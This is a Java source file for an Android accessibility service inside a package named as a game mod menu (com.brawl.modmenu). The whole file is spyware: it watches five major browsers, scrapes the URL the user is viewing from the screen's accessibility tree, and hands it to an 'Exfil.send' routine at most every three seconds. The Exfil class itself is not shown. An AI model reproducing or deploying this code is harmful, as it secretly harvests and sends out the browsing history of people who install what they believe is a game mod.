package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.Arrays;
import java.util.List;

public class BrowserHistory extends AccessibilityService {

    private static final List<String> BROWSERS = Arrays.asList(
        "com.android.chrome",
        "org.mozilla.firefox",
        "com.opera.browser",
        "com.brave.browser",
        "com.microsoft.emmx"
    );

    private long lastSend = 0;
    private static final long COOLDOWN = 3000;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();
        if (!BROWSERS.contains(pkg)) return;

        if (System.currentTimeMillis() - lastSend < COOLDOWN) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        String url = findUrl(root, 0);
        if (url != null && url.length() > 5) {
            Exfil.send("URL", "🌐 " + url);
            lastSend = System.currentTimeMillis();
        }
    }

    private String findUrl(AccessibilityNodeInfo n, int depth) {
        if (n == null || depth > 20) return null;
        CharSequence text = n.getText();
        CharSequence desc = n.getContentDescription();

        if (text != null) {
            String s = text.toString();
            if (s.startsWith("http") || s.contains(".com")
                || s.contains(".org") || s.contains(".net")
                || s.contains(".ru") || s.contains(".ua")) {
                return s;
            }
        }
        if (desc != null) {
            String s = desc.toString();
            if (s.startsWith("http") || s.contains(".com")) return s;
        }
        for (int i = 0; i < n.getChildCount(); i++) {
            String r = findUrl(n.getChild(i), depth + 1);
            if (r != null) return r;
        }
        return null;
    }

    @Override public void onInterrupt() {}
}
